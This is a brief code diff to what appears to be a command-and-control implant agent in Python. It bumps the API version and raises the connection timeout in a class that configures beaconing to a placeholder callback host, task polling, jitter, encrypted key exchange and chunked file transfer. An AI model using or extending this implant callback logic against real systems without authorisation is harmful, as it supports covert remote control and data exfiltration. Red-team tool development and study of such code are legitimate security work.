@@ -9,7 +9,7 @@ class C2():
     from math import ceil
     import ssl
     def __init__(self):
-        self.url_base = "callback_host:callback_port/api/v1.2/"
+        self.url_base = "callback_host:callback_port/api/v1.3/"
         self.checkin_uri = "callbacks"
         self.tasking_uri = "tasks/callback/{}/nextTask"
         self.response_uri = "responses/{}"
@@ -17,7 +17,7 @@ class C2():
         self.id = -1
         self.interval = callback_interval
         self.jitter = 20  # this is a percentage
-        self.timeout = 2  # used for doing timeouts for web connections
+        self.timeout = 20  # used for doing timeouts for web connections
         self.EKE = True if "encrypted_exchange_check" == "T" else False
         self.aes_encryption_key = "AESPSK" if len("AESPSK") > 6 else ""
         self.chunk_size = 1024 * 1000 * 5  # 5MB chunks
